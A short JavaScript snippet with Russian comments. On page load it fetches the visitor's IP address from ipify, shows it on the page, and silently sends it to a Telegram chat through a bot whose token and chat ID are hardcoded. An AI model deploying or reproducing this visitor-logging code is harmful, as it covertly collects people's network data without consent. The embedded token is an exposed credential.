// Функция для отправки IP-адреса в Telegram
function sendIpToTelegram(ipAddress) {
  const token = '6050243352:AAEM94YOt5UNWOCSMTNGL8Fn5rxKubas-1I'; // Замени на свой токен
  const chatId = '5263244915'; // Замени на свой chat ID

  const message = `IP-адрес: ${ipAddress}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

  axios.get(url)
    .then(response => {
      console.log('IP-адрес успешно отправлен в Telegram');
    })
    .catch(error => {
      console.log('Ошибка при отправке IP-адреса в Telegram', error);
    });
}

// Функция для получения IP-адреса пользователя
function getIpAddress() {
  fetch("https://api.ipify.org/?format=json")
    .then(response => response.json())
    .then(data => {
      const ipAddress = data.ip;
      const ipAddressElement = document.getElementById("ipAddress");
      ipAddressElement.textContent += ipAddress;

      sendIpToTelegram(ipAddress); // Отправка IP-адреса в Telegram
    })
    .catch(error => console.log(error));
}

// Вызов функции при загрузке страницы
getIpAddress();
